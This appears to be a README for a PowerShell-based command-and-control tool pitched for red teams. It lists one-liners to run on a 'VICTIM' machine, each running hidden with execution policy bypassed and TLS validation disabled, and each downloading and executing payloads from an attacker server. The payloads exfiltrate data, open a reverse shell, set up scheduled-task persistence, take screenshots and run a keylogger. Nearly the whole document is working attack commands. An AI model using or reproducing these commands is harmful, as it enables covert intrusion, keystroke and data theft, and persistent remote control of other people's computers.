## PowerShellXFiltration
A Python web server to execute several actions on a Windows system, acting like a C2.
Useful for redteam.

### Example
1. Change the settings in `config.py`.
2. Run:
```
#Run the server
ATTACKER> python3 server.py

#For data exfiltration
VICTIM> powershell.exe -ep bypass -nop -windowstyle hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString('http://<SERVER-IP>:<SERVER-PORT>/exf');"

#To get a reverse-shell
VICTIM> powershell.exe -ep bypass -nop -windowstyle hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString('http://<SERVER-IP>:<SERVER-PORT>/rvs');"

#To create a scheduled task (by default runs every hour for 6 days, but can be changed in `client_pers.ps1`)
VICTIM> powershell.exe -ep bypass -nop -windowstyle hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString('http://<SERVER-IP>:<SERVER-PORT>/pers');"

#To take a screenshot
VICTIM> powershell.exe -ep bypass -nop -windowstyle hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString('http://<SERVER-IP>:<SERVER-PORT>/screen');"

#To run a keylogger
VICTIM> powershell.exe -ep bypass -nop -windowstyle hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString('http://<SERVER-IP>:<SERVER-PORT>/klogger');"

#To retrieve keylogger output
VICTIM> powershell.exe -ep bypass -nop -windowstyle hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString('http://<SERVER-IP>:<SERVER-PORT>/klogger_exf');"

#To run a keylogger and automatically get the output every 2 minutes
VICTIM> powershell.exe -ep bypass -nop -windowstyle hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString('http://<SERVER-IP>:<SERVER-PORT>/klogger_full');"

#To run data exfiltration + scheduled task (change the command to execute in `config.py`)
VICTIM> powershell.exe -ep bypass -nop -windowstyle hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString('http://<SERVER-IP>:<SERVER-PORT>/exfpers');"

#To run data exfiltration + screenshot + reverse-shell
VICTIM> powershell.exe -ep bypass -nop -windowstyle hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString('http://<SERVER-IP>:<SERVER-PORT>/all');"
```
